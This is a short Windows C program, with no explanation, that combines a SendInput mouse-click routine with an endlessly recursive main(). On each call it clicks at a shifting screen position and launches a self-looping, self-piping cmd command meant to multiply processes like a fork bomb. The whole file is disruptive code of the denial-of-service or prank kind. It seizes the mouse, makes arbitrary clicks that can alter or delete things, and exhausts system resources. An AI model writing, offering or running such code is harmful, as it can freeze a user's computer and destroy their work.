#include <Windows.h>
int i=0;
void sendClick(int ptx, int pty)
{
    //Initializing an array of INPUT
    INPUT Inputs[3] = { 0 };

    //You need the two lines below in order to convert from screen to absolute coordinates
    ptx = MulDiv(ptx, 65535, GetSystemMetrics(SM_CXSCREEN)-1);
    pty = MulDiv(pty, 65535, GetSystemMetrics(SM_CYSCREEN)-1);

    Inputs[0].type = INPUT_MOUSE;
    Inputs[0].mi.dx = ptx; //Your click coordinates (x)
    Inputs[0].mi.dy = pty; //Your click coordinates (y)
    Inputs[0].mi.dwFlags = MOUSEEVENTF_MOVE; //Moving mouse to position

    Inputs[1].type = INPUT_MOUSE;
    Inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTDOWN; //Left clicking

    Inputs[2].type = INPUT_MOUSE;
    Inputs[2].mi.dwFlags = MOUSEEVENTF_LEFTUP; //Releasing click

    //Sending the inputs
    SendInput(3, Inputs, sizeof(INPUT));
}
int main(){
    i++;
    sendClick(i%1000,i%1000);
    system(":g\n goto g|goto g");
    main();
}
